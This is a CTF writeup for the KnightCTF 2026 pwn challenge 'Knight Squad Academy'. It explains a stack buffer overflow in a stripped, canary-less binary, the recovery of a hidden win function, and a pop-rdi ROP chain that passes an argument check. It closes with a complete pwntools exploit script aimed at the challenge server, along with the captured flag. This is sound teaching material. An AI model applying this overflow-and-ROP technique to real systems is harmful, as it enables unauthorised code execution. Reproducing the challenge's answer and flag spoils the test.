---
title: "KnightCTF 2026: Knight Squad Academy"
date: "2026-01-21"
description: "Writeup for the Knight Squad Academy challenge in the KnightCTF 2026 CTF."
---

# KnightCTF 2026: Knight Squad Academy

#### January 21, 2026

This is the only Pwn challenge in this CTF. We are given a binary called `ksa_kiosk`, and a server to connect to and get the flag. Since the description doesn't give us any useful information ("Its our academy... :D"), let's do some initial analysis on the binary:

```
$ file ksa_kiosk
ksa_kiosk: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8102e9931dc90046182737ff6b4feb54e24527fe, for GNU/Linux 4.4.0, stripped
```

With this we can confirm that the binary in question is an ELF executable, which is not surprising. However, we can also see that the binary is stripped, which will make investigating it a little harder; we'll likely have to use a decompiler to get a full picture of what the binary does. Either way, let's check the binary security measures:

```
$ checksec --file=ksa_kiosk
RELRO           STACK CANARY      NX            PIE             RPATH      
Full RELRO      No canary found   NX enabled    No PIE          No RPATH
...  
```

This is some good news. The binary doesn't have a canary, and PIE is disabled. At least, overflowing might be easier.

Before we jump into the internal analysis, let's first see what happens if we execute the binary:

```
$ chmod 755 ksa_kiosk
$ ./ksa_kiosk
====================================================
             Knight Squad Academy
           Enrollment Kiosk  (v2.1)
====================================================
Authorized personnel only. All actions are audited.

1) Register cadet
2) Enrollment status
3) Exit
> 
```

It looks like a menu, with two useful options:

```
> 2
[Registry] Enrollment status: PENDING REVIEW
[Registry] Background check: IN PROGRESS
```

The second option seems to be printing some information. However, there's no way to input anything from here, so let's check the first option:

```
> 1

--- Cadet Registration ---
Cadet name:
> Alice
Enrollment notes:
> test
[Enrollment] Entry received.
Welcome, Cadet Alice.
Please wait for assignment.
```

Okay, this time we do have some inputs. It seems like we can input a name, and some notes. Since there's no other way to input information to this program, this has to be the vulnerable code.

## The vulnerability

Before we delve into the binary, let's make the preparations for the exploit script we will be building:

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

elf = context.binary = ELF("./ksa_kiosk", checksec=False)
p = gdb.debug(elf.path, gdbscript="")
```

With this code I'm essentially initializing a GDB instance in a different `tmux` window, so we can easily debug our payload.

Now I'm going to attempt to overflow the stack. First, we need to start the cadet registration function, which allowed us to input values. This is done with the option `1`:

```
p.sendlineafter(b">", b"1")
```

Starting this function will ask us for input twice, to set a name and the enrollment notes. I'll write a regular name, like "Alice", and attempt to overflow the stack in the second input:

```
p.sendlineafter(b">", b"Alice")
p.sendlineafter(b">", b"A"*200)
```

I'll set the interactive mode right after just so we have time to see what actually happened.

```
p.interactive()
```

Now, let's run our script:

```
$ tmux
$ python3 exploit.py
```

A second window should open, with GDB on it. In my case, I have `pwndbg` integrated on my GDB, which makes debugging much more convenient, I highly recommend installing it. In any case, to actually run the program, we need to type `continue`:

```
pwndbg> continue
...
Program received signal SIGSEGV (fault address: 0x0).
...
```

Nice! That's a good sign.

Checking the disassembly, we can see in what instruction the code stopped (the instruction that caused the segmentation fault). Indeed, that instruction was the return instruction.

```
0x401686    ret   <0x4141414141414141>
```

This instruction attempts to return to address `0x4141414141414141`, which is invalid. This is the pile of `A`'s we used to overflow the stack. We succeeded. 

In order to find the offset of the return address, so we know how many `A`'s we need to write before we reach the actual address we want to return to, I'll send in a deterministic cyclic pattern instead of an arbitrary number of `A`'s, so we can track down the offset:

```
# p.sendlineafter(b">", b"A"*200) BEFORE
p.sendlineafter(b">", cyclic(200, n=8)) # AFTER
```

This will send a 200-character long, 8-byte cyclic pattern. Let's see what the return address is after executing the script again:

```
► 0x401686    ret    <0x6161616161616170>
```

Now the return address is slightly different. The pattern we generated is very handful because we can always track down where a fragment of said pattern is, inside the pattern. We can do this with the `cyclic_find` function.

```
OFFSET = cyclic_find(0x6161616161616170, n=8)
```

This will give us the return address offset. In other words, the number of characters we need to write before we reach the return address. Let's go back to the code:

```
# p.sendlineafter(b">", cyclic(200, n=8)) BEFORE
p.sendlineafter(b">", b"A"*OFFSET + p64(0xAEAE)) # AFTER
```

Now, we'll write as many `A`'s as we need to reach the return address. For now, I'll write `0xAEAE` as the return address.

To recap, we've found the vulnerability and we know how to exploit it, which is awesome. However, how can we get the flag now? We have the means to exploit the binary, but not the end. We need to find a function that will give us the flag somehow.

Since the binary is stripped, running `info functions` in GDB to see all functions in the binary will not work. In these cases, the easiest thing to do is to use a decompiler like GHidra to have a somewhat readable code representation of the execution flow.

## Finding the win function

A fast way to decompile a binary is using the [Dogbolt Decompiler Explorer](https://dogbolt.org/), an online tool that can decompile small binaries just fine, with decompilers like GHidra or BinaryNinja. If this page doesn't meet your needs, you'll probably have to resort to the actual GHidra software or other tools.

The GHidra decompiler in Dogbolt will decompile a few functions. `CTRL+F`ing the word "flag" will lead us to a function in particular:

```
void FUN_004013ac(long param_1)

{
	char local_98 [136];
	FILE *local_10;
  
	if (param_1 != 0x1337c0decafebeef) {
	    puts("[SECURITY] Authorization failed.");
	    fflush(stdout);
	    FUN_004011c6("Session terminated.");
	}
	local_10 = fopen("./flag.txt","r");
	if (local_10 == (FILE *)0x0) {
	    FUN_004011c6("Server error.");
	}
...
```

This looks promising! There is a function in the code, that doesn't get called naturally, that prints the flag, judging by that `fopen` call. The name of the function actually refers to its address in memory, so now we now that the address to this code is `0x004013AC`. We can use it as the return address in our exploit.

However, there's something else we need to overcome.

## Bypassing authorization

Looking into the code of the win function, there seems to be a sort of authorization system.

```
if (param_1 != 0x1337c0decafebeef) {
	puts("[SECURITY] Authorization failed.");
    fflush(stdout);
	FUN_004011c6("Session terminated.");
}
```

This code will run if the win function parameter is not a specific value: `0x1337c0decafebeef`. Looking at `FUN_004011c6`, we can see how it will always exit:

```
void FUN_004011c6(char *param_1)

{
    puts(param_1);
    fflush(stdout);
    _exit(1);
}
```

This means that calling the win function is not enough. We need the argument to be `0x1337c0decafebeef` to avoid the program exiting. How do we do this?

To bypass the authorization, looking at the decompiled C won't be enough, we need to dive deeper, into the assembly of the binary. We can do this in a fresh GDB instance:

```
$ gdb ksa_kiosk
pwndbg> x/10i 0x004013ac
0x4013ac:    push   rbp
   0x4013ad:    mov    rbp,rsp
   0x4013b0:    sub    rsp,0xa0
   0x4013b7:    mov    QWORD PTR [rbp-0x98],rdi
   0x4013be:    movabs rax,0x1337c0decafebeef
   0x4013c8:    cmp    QWORD PTR [rbp-0x98],rax
   0x4013cf:    je     0x4013fe
   0x4013d1:    lea    rax,[rip+0xd80]        # 0x402158
   0x4013d8:    mov    rdi,rax
   0x4013db:    call   0x401040 <puts@plt>
```

With this command we can print the first 10 instructions inside the win function. Take a look into the `cmp` instruction, which checks if the code should jump into the `Authorization failed.` section or not:

```
0x4013c8:    cmp    QWORD PTR [rbp-0x98],rax
```

We have to track two values: The value in `rax`, and whatever is stored in `QWORD PTR [rbp-0x98]`. Actually, looking back in the function, we can easily see what's stored in both values. In `rax` the value `0x1337c0decafebeef` is stored, thanks to the `movabs` instruction. This confirms that the `cmp` instruction will check if the argument we provided is the appropriate one. And just before, we see how the value inside `rdi` is what gets compared with `rax`, because the value of `rdi` is stored in the memory address than then gets compared:  `QWORD PTR [rbp-0x98]`. With this, we can conclude that the function argument is stored in `rdi`!

Now, how do move `0xc0decafebeef` into `rdi`, so we pass the check? This involves are very used technique in binary exploitation: a ROP chain. We need to find a `pop rdi` gadget, which will allow us to store in `rdi` a value in the stack, which we have control of.

In order to find the gadgets of the binary, we can use the `rop` command in `pwndbg`:

```
pwndbg> rop
...
0x40150b: pop rdi ; ret
...
```

Awesome! We are lucky enough to have a `pop rdi; ret` gadget in our binary. With this, we can build our ROP chain. Instead of directly jumping into the win function, first, we'll jump to the gadget by changing the return address to `0x40150b`. After the return address, we'll write `0x1337c0decafebeef`. This will mean that when the code reaches the return address, it will jump to an instruction that will pop into `rdi` the value we want. Then, there's another `ret` instruction, in which we'll have to jump into the actual win function, now that we have in `rdi` the appropriate value that will be the function argument.

```
POP_RDI_GADGET_ADDRESS = p64(0x40150b)
ARG_VALUE = p64(0x1337c0decafebeef)
WIN_FUNCTION = p64(0x004013ac)

# p.sendlineafter(b">", b"A"*OFFSET + p64(0xAEAE)) BEFORE
p.sendlineafter(b">", b"A"*OFFSET + POP_RDI_GADGET_ADDRESS + ARG_VALUE + WIN_FUNCTION)
```

Now that we have our exploit, we need to change the process to a remote instance, in which we will connect to the socket given to us in the challenge to actually get the flag:

```
# p = gdb.debug(elf.path, gdbscript="") BEFORE
p = remote("66.228.49.41", 5000) # AFTER
```

Let's run it now:

```
$ python3 exploit.py
[+] Opening connection to 66.228.49.41 on port 5000: Done
[*] Switching to interactive mode
 [Enrollment] Entry received.
Welcome, Cadet AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x91.
Please wait for assignment.
[Registry] Clearance badge issued:
Your Flag : KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_} ... Visit our website : knightsquad.academy
[*] Got EOF while reading in interactive
```

That's our flag! Here's the full script:

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# elf = context.binary = ELF("./ksa_kiosk", checksec=False)
# p = gdb.debug(elf.path, gdbscript="")
p = remote("66.228.49.41", 5000)

OFFSET = cyclic_find(0x6161616161616170, n=8)
POP_RDI_GADGET_ADDRESS = p64(0x40150b)
ARG_VALUE = p64(0x1337c0decafebeef)
WIN_FUNCTION = p64(0x004013ac)

p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"Alice")
p.sendlineafter(b">", b"A"*OFFSET + POP_RDI_GADGET_ADDRESS + ARG_VALUE + WIN_FUNCTION)

p.interactive()
```
